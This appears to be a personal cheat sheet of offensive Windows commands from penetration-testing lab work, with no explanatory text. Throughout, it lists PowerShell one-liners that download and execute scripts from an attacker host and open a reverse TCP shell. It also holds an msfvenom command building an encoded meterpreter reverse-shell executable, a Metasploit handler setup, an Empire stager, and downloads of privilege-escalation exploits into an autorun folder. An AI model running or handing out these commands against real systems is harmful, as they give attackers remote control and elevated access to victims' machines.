powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.124:8001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.124 -Port 8002

powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.124:8001/program.exe' -OutFILE 'C:\Program Files\Autorun Program\program.exe'"
powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.124:8001/Invoke-PowerShellTcp.ps1' -OutFILE 'C:\users\kostas\Desktop\Invoke-PowerShellTcp.ps1'"

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe

use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.20.231:8001/shell-.exe','shell.exe')"

powershell -c "Invoke-WebRequest -Uri 'http://10.10.200.223:8000/program.exe' -OutFILE 'C:\Program Files\Autorun Program\program.exe'"

powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.124:8282/39719.ps1' -OutFILE 'C:\Users\kostas\Desktop\39719.ps1'"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.6:9005/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"

powershell IEX(New-Object Net.WebClient).downloadString(‘http://<attacking machine>/Empire.ps1')


C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe -ep bypass -File \\10.10.14.124\kali\tools\enumeration\nmapAutomator\10.129.1.127\MS16-032.ps1
